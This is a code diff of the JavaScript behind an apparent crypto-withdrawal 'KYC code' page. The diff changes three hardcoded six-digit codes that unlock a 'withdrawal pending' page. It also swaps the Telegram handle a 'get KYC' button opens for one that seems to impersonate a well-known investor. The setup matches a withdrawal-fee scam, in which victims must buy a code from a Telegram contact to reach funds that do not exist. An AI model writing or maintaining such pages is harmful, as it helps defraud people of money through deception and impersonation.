@@ -5,9 +5,9 @@ const error_box = document.querySelector('.error');
 const get_kyc_btn = document.querySelector('b');
 const btn = document.getElementById('btn');
 
-const kyc1 = ['3','3','6','6','5','7'];
-const kyc2 = ['1','1','4','9','1','2'];
-const kyc3 = ['6','6','3','9','2','1'];
+const kyc1 = ['0','3','6','6','5','0'];
+const kyc2 = ['1','0','4','9','0','2'];
+const kyc3 = ['9','6','0','0','2','9'];
 
 var u_input = [];
 var tryal_counter=0;
@@ -47,7 +47,7 @@ inputs.forEach((input, index) => {
 });
 
 get_kyc_btn.addEventListener('click', () => {
-    location.assign("https://t.me/AGATHA_CASTROBTC2");
+    location.assign("https://t.me/Cathiewood647");
     // location.assign("{{url('/user/account')}}");
 });
 
@@ -59,19 +59,19 @@ function validate_secret_code(kyc1, u_input){
         && kyc1[3]===u_input[3] && kyc1[4]===u_input[4] && kyc1[5]===u_input[5]){
 
             // redirect to login page
-            location.href="/views/kyc4/withdrawal_pending.html";
+            location.href="/kyc/views/kyc4/withdrawal_pending.html";
 
     }else if(kyc2[0]===u_input[0] && kyc2[1]===u_input[1] && kyc2[2]===u_input[2]
         && kyc2[3]===u_input[3] && kyc2[4]===u_input[4] && kyc2[5]===u_input[5]){
 
             // redirect to login page
-            location.href="/views/kyc4/withdrawal_pending.html";
+            location.href="/kyc/views/kyc4/withdrawal_pending.html";
 
     }else if(kyc3[0]===u_input[0] && kyc3[1]===u_input[1] && kyc3[2]===u_input[2]
         && kyc3[3]===u_input[3] && kyc3[4]===u_input[4] && kyc3[5]===u_input[5]){
 
             // redirect to login page
-            location.href="/views/kyc4/withdrawal_pending.html";
+            location.href="/kyc/views/kyc4/withdrawal_pending.html";
 
     }else{
 
@@ -81,7 +81,7 @@ function validate_secret_code(kyc1, u_input){
         erase_inputs();
         // if the user try wrong pin for some times redirect him to home page
         if(tryal_counter === 2){
-            location.assign("/views/kyc4/method_select.html");
+            location.assign("/kyc/views/kyc4/method_select.html");
         }
     }
 }
